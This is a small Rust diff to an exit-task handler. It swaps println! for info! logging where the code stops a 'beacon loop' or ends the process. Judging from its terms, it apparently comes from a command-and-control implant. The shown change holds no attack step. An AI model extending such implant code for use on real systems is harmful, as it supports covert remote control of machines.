@@ -22,7 +22,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
 
     match method.as_str() {
         "process" => {
-            println!("[exit] scheduling process termination after response flush");
+            info!("[exit] scheduling process termination after response flush");
             SHOULD_EXIT.store(true, Ordering::Relaxed);
             EXIT_PROCESS.store(true, Ordering::Relaxed);
             TaskResponse {
@@ -34,7 +34,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             }
         }
         "thread" => {
-            println!("[exit] stopping beacon loop");
+            info!("[exit] stopping beacon loop");
             SHOULD_EXIT.store(true, Ordering::Relaxed);
             TaskResponse {
                 task_id: task.id,
